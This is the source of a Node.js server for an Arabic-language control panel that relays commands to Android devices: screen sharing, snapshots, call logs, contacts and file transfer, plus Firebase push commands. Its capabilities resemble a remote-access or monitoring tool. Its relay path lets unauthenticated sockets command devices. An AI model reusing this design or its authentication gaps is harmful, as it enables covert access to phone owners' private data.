const express = require('express');
const http = require('http');
const { WebSocketServer } = require('ws');
const path = require('path');
const fs = require('fs');
const crypto = require('crypto');
const admin = require('firebase-admin');

const app = express();
const server = http.createServer(app);

// Trust proxy (Railway runs behind reverse proxy)
app.set('trust proxy', 1);

const publicPath = path.join(__dirname, 'public');
if (!fs.existsSync(publicPath)) {
  console.error(`FATAL: Public directory not found at: ${publicPath}`);
  process.exit(1);
}

app.use(express.json());

app.use((req, res, next) => {
  console.log(`HTTP request: ${req.method} ${req.url}`);
  next();
});

// ─────────────────────────────────────────────────────────────
// Firebase Admin SDK initialization (FCM HTTP v1 API)
// ─────────────────────────────────────────────────────────────
let firebaseReady = false;

try {
  const raw = process.env.FIREBASE_SERVICE_ACCOUNT_JSON;
  if (!raw) {
    console.warn('[Firebase] FIREBASE_SERVICE_ACCOUNT_JSON not set — FCM push disabled.');
  } else {
    const serviceAccount = JSON.parse(raw);
    admin.initializeApp({
      credential: admin.credential.cert(serviceAccount)
    });
    firebaseReady = true;
    console.log(`[Firebase] Admin SDK initialized for project: ${serviceAccount.project_id}`);
  }
} catch (error) {
  console.error('[Firebase] Failed to initialize Admin SDK:', error.message);
  firebaseReady = false;
}

async function sendFcmMessage(token, command) {
  if (!firebaseReady) {
    return { success: false, error: 'Firebase Admin SDK not initialized', code: 'FIREBASE_NOT_READY' };
  }

  const message = {
    token: token,
    data: { command: command },
    android: { priority: 'high' }
  };

  try {
    const messageId = await admin.messaging().send(message);
    console.log(`[FCM] Sent "${command}" → ${messageId}`);
    return { success: true };
  } catch (error) {
    const code = error.code || 'unknown';
    const stale =
      code === 'messaging/registration-token-not-registered' ||
      code === 'messaging/invalid-registration-token' ||
      code === 'messaging/invalid-argument';

    console.warn(`[FCM] Send failed (${code}): ${error.message}`);
    return { success: false, error: error.message, code, stale };
  }
}

// ─────────────────────────────────────────────────────────────
// Authentication System
// ─────────────────────────────────────────────────────────────
// The password is read from the WEB_PASSWORD environment variable
// on Railway. If not set, authentication is DISABLED (open panel).
// ─────────────────────────────────────────────────────────────

const WEB_PASSWORD = process.env.WEB_PASSWORD || null;
const SESSION_TTL_MS = 7 * 24 * 60 * 60 * 1000; // 7 days
const COOKIE_NAME = 'cloud_sync_auth';

// In-memory session store: token → { createdAt }
const activeSessions = new Map();

if (WEB_PASSWORD) {
  console.log('[AUTH] Password protection is ENABLED.');
} else {
  console.warn('[AUTH] WEB_PASSWORD not set — panel is OPEN to everyone!');
}

function generateSessionToken() {
  return crypto.randomBytes(32).toString('hex');
}

function parseCookies(cookieHeader) {
  const cookies = {};
  if (!cookieHeader) return cookies;
  cookieHeader.split(';').forEach(c => {
    const idx = c.indexOf('=');
    if (idx > 0) {
      const k = c.substring(0, idx).trim();
      const v = c.substring(idx + 1).trim();
      cookies[k] = decodeURIComponent(v);
    }
  });
  return cookies;
}

function isValidToken(token) {
  if (!token) return false;
  const session = activeSessions.get(token);
  if (!session) return false;
  if (Date.now() - session.createdAt > SESSION_TTL_MS) {
    activeSessions.delete(token);
    return false;
  }
  return true;
}

function isAuthenticated(req) {
  if (!WEB_PASSWORD) return true; // Auth disabled
  const cookies = parseCookies(req.headers.cookie);
  return isValidToken(cookies[COOKIE_NAME]);
}

// ─────────────────────────────────────────────────────────────
// Login / Logout routes (PUBLIC — no auth required)
// ─────────────────────────────────────────────────────────────

app.get('/login', (req, res) => {
  // Already authenticated → redirect to panel
  if (isAuthenticated(req)) return res.redirect('/');
  res.send(LOGIN_PAGE_HTML);
});

app.post('/login', (req, res) => {
  const { password } = req.body || {};

  if (!WEB_PASSWORD) {
    return res.status(500).json({
      success: false,
      error: 'No password configured on server.'
    });
  }

  if (!password || password !== WEB_PASSWORD) {
    console.warn(`[AUTH] Failed login attempt from ${req.ip}`);
    return res.status(401).json({
      success: false,
      error: 'كلمة المرور غير صحيحة'
    });
  }

  const token = generateSessionToken();
  activeSessions.set(token, { createdAt: Date.now() });

  const isHttps = req.secure || req.headers['x-forwarded-proto'] === 'https';

  res.cookie(COOKIE_NAME, token, {
    httpOnly: true,
    sameSite: 'lax',
    secure: isHttps,
    maxAge: SESSION_TTL_MS,
    path: '/'
  });

  console.log(`[AUTH] Login success from ${req.ip}`);
  res.json({ success: true });
});

app.get('/logout', (req, res) => {
  const cookies = parseCookies(req.headers.cookie);
  const token = cookies[COOKIE_NAME];
  if (token) {
    activeSessions.delete(token);
    console.log('[AUTH] Session destroyed');
  }
  res.clearCookie(COOKIE_NAME, { path: '/' });
  res.redirect('/login');
});

app.get('/api/auth-status', (req, res) => {
  res.json({
    authEnabled: !!WEB_PASSWORD,
    authenticated: isAuthenticated(req)
  });
});

// ─────────────────────────────────────────────────────────────
// AUTH MIDDLEWARE — protects everything below
// ─────────────────────────────────────────────────────────────

// Paths that never require authentication:
const PUBLIC_PATHS = new Set([
  '/login',
  '/logout',
  '/api/auth-status',
  '/api/fcm-token'      // Android registers token here (trusted device)
]);

app.use((req, res, next) => {
  // If no password is set, everything is open (backwards compatible)
  if (!WEB_PASSWORD) return next();

  // Whitelisted paths
  if (PUBLIC_PATHS.has(req.path)) return next();

  // Authenticated → proceed
  if (isAuthenticated(req)) return next();

  // Not authenticated
  if (req.path.startsWith('/api/')) {
    return res.status(401).json({ error: 'Unauthorized' });
  }

  // HTML pages → redirect to login
  return res.redirect('/login');
});

// ─────────────────────────────────────────────────────────────
// Static files (now protected by middleware above)
// ─────────────────────────────────────────────────────────────
app.use(express.static(publicPath));

// ─────────────────────────────────────────────────────────────
// In-memory stores
// ─────────────────────────────────────────────────────────────
const fcmTokens = new Map();
const wsIdToDeviceId = new Map();
const androidDeviceInfo = new Map();

// ─────────────────────────────────────────────────────────────
// FCM endpoints
// ─────────────────────────────────────────────────────────────

app.post('/api/fcm-token', (req, res) => {
  const { token, deviceId } = req.body;
  if (!token || !deviceId) {
    return res.status(400).json({ error: 'Missing token or deviceId' });
  }
  fcmTokens.set(deviceId, token);
  console.log(`[FCM] Registered token for device: ${deviceId} -> ${token.substring(0, 15)}...`);
  res.json({ success: true, totalDevices: fcmTokens.size });
});

app.post('/api/fcm/send', async (req, res) => {
  let { deviceId, wsId, command } = req.body;

  if (!command) return res.status(400).json({ error: 'Missing command' });

  if (!deviceId && wsId) {
    deviceId = wsIdToDeviceId.get(wsId);
    if (!deviceId) return res.status(404).json({ error: 'No device mapping for wsId: ' + wsId });
  }
  if (!deviceId) return res.status(400).json({ error: 'Missing deviceId or wsId' });

  const token = fcmTokens.get(deviceId);
  if (!token) return res.status(404).json({ error: 'No FCM token registered for this device' });

  if (!firebaseReady) {
    return res.status(501).json({ error: 'Firebase Admin SDK not initialized on server.' });
  }

  console.log(`[FCM] Sending command: ${command} to device: ${deviceId}`);
  const result = await sendFcmMessage(token, command);

  if (result.success) {
    res.json({ success: true });
  } else {
    if (result.stale) {
      console.warn(`[FCM] Removing stale token for device: ${deviceId} (${result.code})`);
      fcmTokens.delete(deviceId);
    }
    res.status(500).json({ success: false, error: result.error, code: result.code });
  }
});

app.post('/api/fcm/send-to-all', async (req, res) => {
  const { command } = req.body;

  if (!command) {
    return res.status(400).json({ error: 'Missing command' });
  }

  if (fcmTokens.size === 0) {
    return res.json({
      success: true,
      sent: 0,
      failed: 0,
      message: 'No FCM tokens registered yet. Open the app on at least one device first.'
    });
  }

  if (!firebaseReady) {
    return res.status(501).json({
      error: 'Firebase Admin SDK not initialized on server.',
      knownDevices: fcmTokens.size
    });
  }

  console.log(`[FCM-Broadcast] Broadcasting "${command}" to ${fcmTokens.size} device(s)`);

  let sent = 0, failed = 0;
  const results = [];

  for (const [deviceId, token] of fcmTokens.entries()) {
    const result = await sendFcmMessage(token, command);

    if (result.success) {
      sent++;
      results.push({ deviceId, success: true, error: null });
    } else {
      failed++;
      results.push({
        deviceId,
        success: false,
        error: result.code || result.error || 'unknown'
      });

      if (result.stale) {
        console.warn(`[FCM-Broadcast] Removing stale token for device: ${deviceId} (${result.code})`);
        fcmTokens.delete(deviceId);
      }
    }
  }

  console.log(`[FCM-Broadcast] Done: sent=${sent}, failed=${failed}`);
  res.json({ success: true, sent, failed, results });
});

app.get('/api/devices/known', (req, res) => {
  const known = [];

  for (const [deviceId, token] of fcmTokens.entries()) {
    let wsId = null;
    for (const [w, d] of wsIdToDeviceId.entries()) {
      if (d === deviceId) { wsId = w; break; }
    }

    const info = wsId ? androidDeviceInfo.get(wsId) : null;
    const online = wsId ? androidClients.has(wsId) : false;

    known.push({
      deviceId,
      wsId,
      online,
      name: info?.name || null,
      model: info?.model || null,
      tokenPreview: token.substring(0, 12) + '...'
    });
  }

  res.json({
    count: known.length,
    firebaseReady,
    devices: known
  });
});

app.get('/api/devices', (req, res) => {
  const devices = [];
  androidClients.forEach((ws, wsId) => {
    const info = androidDeviceInfo.get(wsId) || {};
    devices.push({
      wsId: wsId,
      deviceId: info.deviceId || wsIdToDeviceId.get(wsId) || null,
      model: info.model || null,
      name: info.name || null,
      connectedAt: info.connectedAt || null,
      online: ws.readyState === 1
    });
  });
  res.json({ devices });
});

// ─────────────────────────────────────────────────────────────
// SPA fallback
// ─────────────────────────────────────────────────────────────

app.get(/^(?!\/api|\/login|\/logout).*/, (req, res) => {
  const indexPath = path.join(publicPath, 'index.html');
  if (fs.existsSync(indexPath)) {
    res.sendFile(indexPath);
  } else {
    res.status(404).send('index.html not found');
  }
});

// ─────────────────────────────────────────────────────────────
// Native WebSocket Server
// ─────────────────────────────────────────────────────────────

const wss = new WebSocketServer({ server, perMessageDeflate: false });

const webClients = new Map();
const androidClients = new Map();
let idCounter = 0;

function generateClientId() {
  return 'ws_' + (++idCounter) + '_' + Math.random().toString(36).substring(2, 10);
}

function sendTo(ws, message) {
  if (ws && ws.readyState === 1) ws.send(JSON.stringify(message));
}

function broadcastToAndroid(message) {
  const data = JSON.stringify(message);
  androidClients.forEach((ws) => { if (ws.readyState === 1) ws.send(data); });
}

function broadcastToWeb(message) {
  const data = JSON.stringify(message);
  webClients.forEach((ws) => { if (ws.readyState === 1) ws.send(data); });
}

function findClient(id) {
  return webClients.get(id) || androidClients.get(id);
}

function buildAndroidReadyPayload(wsId) {
  const info = androidDeviceInfo.get(wsId) || {};
  return {
    type: 'android-client-ready',
    id: wsId,
    model: info.model || null,
    name: info.name || null,
    deviceId: info.deviceId || wsIdToDeviceId.get(wsId) || null
  };
}

const relayEvents = [
  'signal',
  'call_log',
  'fs:list', 'fs:files', 'fs:download', 'fs:download_ready', 'fs:delete',
  'fs:download_start', 'fs:download_chunk', 'fs:download_complete',
  'fs:download_error', 'fs:delete_result', 'fs:upload_start', 'fs:upload_chunk',
  'fs:upload_complete',
  'fs:thumb_request', 'fs:thumb_batch',
  'fs:preview_request', 'fs:preview_meta', 'fs:preview_chunk',
  'fs:preview_complete', 'fs:preview_error', 'fs:preview_cancel',
  'cmd:start', 'cmd:stop', 'cmd:screen_share',
  'cmd:get_apps', 'cmd:get_contacts',
  'cmd:set_quality', 'cmd:launch_app', 'cmd:take_snapshot',
  'apps_list', 'contacts_list', 'device_info', 'snapshot_data'
];

wss.on('connection', (ws, req) => {
  const clientId = generateClientId();
  ws.clientId = clientId;
  ws.clientType = null;

  // Check authentication from the upgrade request cookies
  const cookies = parseCookies(req.headers.cookie);
  const authToken = cookies[COOKIE_NAME];
  ws.isAuthenticated = isValidToken(authToken) || !WEB_PASSWORD;

  console.log(`Client connected: ${clientId} (auth: ${ws.isAuthenticated})`);

  sendTo(ws, { type: 'id', id: clientId });

  ws.on('message', (raw) => {
    let msg;
    try {
      msg = JSON.parse(raw.toString());
    } catch (e) {
      console.warn(`Invalid JSON from ${clientId}`);
      return;
    }

    const { type, ...payload } = msg;

    if (!type) return;

    // ── Identification handshake ──
    if (type === 'identify') {
      const clientType = payload.clientType || payload.data;
      if (clientType !== 'web' && clientType !== 'android') return;

      // Web clients MUST be authenticated (if password is set)
      if (clientType === 'web' && !ws.isAuthenticated) {
        console.warn(`[AUTH] Unauthorized web client ${clientId} — closing`);
        sendTo(ws, { type: 'error', message: 'Unauthorized', code: 'UNAUTHORIZED' });
        try { ws.close(4001, 'Unauthorized'); } catch (e) {}
        return;
      }

      ws.clientType = clientType;
      console.log(`Client ${clientId} identified as: ${clientType}`);

      if (clientType === 'web') {
        webClients.set(clientId, ws);
        androidClients.forEach((androidWs, androidId) => {
          sendTo(androidWs, { type: 'web-client-ready', id: clientId });
          sendTo(ws, buildAndroidReadyPayload(androidId));
        });
      } else if (clientType === 'android') {
        androidClients.set(clientId, ws);

        const deviceId = payload.deviceId || null;
        if (deviceId) {
          wsIdToDeviceId.set(clientId, deviceId);
        }

        const info = {
          model: payload.model || null,
          name: payload.name || null,
          manufacturer: payload.manufacturer || null,
          deviceId: deviceId,
          connectedAt: Date.now()
        };
        androidDeviceInfo.set(clientId, info);

        webClients.forEach((webWs, webId) => {
          sendTo(ws, { type: 'web-client-ready', id: webId });
          sendTo(webWs, buildAndroidReadyPayload(clientId));
        });
      }

      console.log(`Clients - Web: ${webClients.size}, Android: ${androidClients.size}`);
      return;
    }

    // ── Web client re-announces itself ──
    if (type === 'web-client-ready') {
      if (!ws.isAuthenticated) return;
      if (!webClients.has(clientId)) {
        webClients.set(clientId, ws);
        ws.clientType = 'web';
      }
      androidClients.forEach((androidWs) => {
        sendTo(androidWs, { type: 'web-client-ready', id: clientId });
      });
      return;
    }

    // ── Relay events ──
    if (relayEvents.includes(type)) {
      const targetId = payload.to;
      const forwardMsg = { type, ...payload, from: clientId };

      if (targetId) {
        const targetWs = findClient(targetId);
        if (targetWs) {
          sendTo(targetWs, forwardMsg);
        } else {
          sendTo(ws, {
            type: 'error',
            message: `Recipient ${targetId} not found`,
            code: 'RECIPIENT_NOT_FOUND'
          });
        }
      } else {
        if (webClients.has(clientId)) {
          broadcastToAndroid(forwardMsg);
        } else if (androidClients.has(clientId)) {
          broadcastToWeb(forwardMsg);
        }
      }
      return;
    }
  });

  ws.on('close', () => {
    console.log(`Client disconnected: ${clientId}`);
    const wasWeb = webClients.delete(clientId);
    const wasAndroid = androidClients.delete(clientId);

    if (wasWeb) {
      broadcastToAndroid({ type: 'web-client-disconnected', id: clientId });
    }
    if (wasAndroid) {
      wsIdToDeviceId.delete(clientId);
      androidDeviceInfo.delete(clientId);
      broadcastToWeb({ type: 'android-client-disconnected', id: clientId });
    }
  });

  ws.on('error', (error) => {
    console.error(`WebSocket error from ${clientId}:`, error);
  });
});

server.on('error', (error) => {
  console.error('Server error:', error);
});

// ─────────────────────────────────────────────────────────────
// Periodic cleanup of expired sessions
// ─────────────────────────────────────────────────────────────
setInterval(() => {
  const now = Date.now();
  let cleaned = 0;
  for (const [token, session] of activeSessions.entries()) {
    if (now - session.createdAt > SESSION_TTL_MS) {
      activeSessions.delete(token);
      cleaned++;
    }
  }
  if (cleaned > 0) console.log(`[AUTH] Cleaned ${cleaned} expired session(s)`);
}, 60 * 60 * 1000); // Every hour

// ─────────────────────────────────────────────────────────────
// Login page HTML (embedded)
// ─────────────────────────────────────────────────────────────
const LOGIN_PAGE_HTML = `<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>تسجيل الدخول</title>
<link rel="preconnect" href="https://fonts.googleapis.com">
<link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;600;700;800&display=swap" rel="stylesheet">
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{
  font-family:'Plus Jakarta Sans',system-ui,sans-serif;
  background:#08090f;
  background-image:
    radial-gradient(at 0% 0%, rgba(13,20,41,.9) 0, transparent 50%),
    radial-gradient(at 100% 100%, rgba(6,30,40,.7) 0, transparent 50%);
  min-height:100vh;
  display:flex;
  align-items:center;
  justify-content:center;
  color:#f3f4f6;
  padding:20px;
}
.card{
  background:rgba(22,26,46,.7);
  backdrop-filter:blur(16px);
  border:1px solid rgba(255,255,255,.05);
  border-radius:20px;
  padding:36px 28px;
  width:100%;
  max-width:400px;
  text-align:center;
  box-shadow:0 8px 32px rgba(0,0,0,.4);
}
.orb{
  width:64px;height:64px;
  margin:0 auto 16px;
  background:linear-gradient(135deg,#00f0ff 0%,#3b82f6 100%);
  border-radius:50%;
  display:flex;align-items:center;justify-content:center;
  font-size:28px;
  box-shadow:0 0 30px rgba(0,240,255,.4);
}
h1{font-size:20px;font-weight:800;margin-bottom:6px;color:#fff}
p{font-size:13px;color:#9ca3af;margin-bottom:24px}
input{
  width:100%;
  padding:14px 18px;
  background:rgba(0,0,0,.3);
  border:1px solid rgba(255,255,255,.08);
  border-radius:12px;
  color:#00f0ff;
  font-family:inherit;
  font-size:15px;
  outline:none;
  text-align:center;
  letter-spacing:2px;
  transition:all .3s;
}
input:focus{
  border-color:rgba(0,240,255,.5);
  box-shadow:0 0 15px rgba(0,240,255,.15);
}
button{
  width:100%;
  margin-top:16px;
  padding:14px;
  border:none;
  border-radius:12px;
  background:linear-gradient(135deg,#00f0ff 0%,#3b82f6 100%);
  color:#05050a;
  font-family:inherit;
  font-size:15px;
  font-weight:700;
  cursor:pointer;
  transition:all .3s;
  box-shadow:0 0 20px rgba(0,240,255,.25);
}
button:hover:not(:disabled){
  transform:translateY(-2px);
  box-shadow:0 0 30px rgba(0,240,255,.5);
}
button:disabled{opacity:.5;cursor:not-allowed}
.error{
  margin-top:14px;
  padding:10px;
  border-radius:10px;
  background:rgba(239,68,68,.1);
  border:1px solid rgba(239,68,68,.3);
  color:#ef4444;
  font-size:13px;
  display:none;
}
.error.show{display:block}
</style>
</head>
<body>
  <div class="card">
    <div class="orb">🔐</div>
    <h1>لوحة التحكم</h1>
    <p>أدخل كلمة المرور للمتابعة</p>

    <input
      type="password"
      id="password"
      placeholder="••••••••"
      autocomplete="current-password"
      autofocus>

    <button id="btnLogin" type="button">دخول</button>

    <div class="error" id="error"></div>
  </div>

<script>
const input = document.getElementById('password');
const btn = document.getElementById('btnLogin');
const err = document.getElementById('error');

async function login() {
  const password = input.value.trim();
  if (!password) {
    showError('أدخل كلمة المرور');
    return;
  }

  btn.disabled = true;
  btn.textContent = 'جارٍ التحقق...';
  err.classList.remove('show');

  try {
    const r = await fetch('/login', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ password })
    });

    const data = await r.json();

    if (data.success) {
      btn.textContent = '✓ تم الدخول';
      setTimeout(() => { window.location.href = '/'; }, 400);
    } else {
      showError(data.error || 'فشل التحقق');
      btn.disabled = false;
      btn.textContent = 'دخول';
      input.value = '';
      input.focus();
    }
  } catch (e) {
    showError('خطأ في الاتصال');
    btn.disabled = false;
    btn.textContent = 'دخول';
  }
}

function showError(msg) {
  err.textContent = msg;
  err.classList.add('show');
}

btn.addEventListener('click', login);
input.addEventListener('keydown', e => { if (e.key === 'Enter') login(); });
</script>
</body>
</html>`;

// ─────────────────────────────────────────────────────────────
// Start server
// ─────────────────────────────────────────────────────────────
const PORT = process.env.PORT || 3000;
server.listen(PORT, '0.0.0.0', () => {
  console.log(`Server running at http://0.0.0.0:${PORT}`);
  console.log(`[FCM] Firebase Admin SDK: ${firebaseReady ? 'READY' : 'NOT READY'}`);
  console.log(`[AUTH] Password protection: ${WEB_PASSWORD ? 'ENABLED' : 'DISABLED'}`);
});

process.on('SIGINT', () => {
  console.log('\nShutting down server...');
  wss.close(() => {
    server.close(() => {
      console.log('Server shut down gracefully');
      process.exit(0);
    });
  });
});
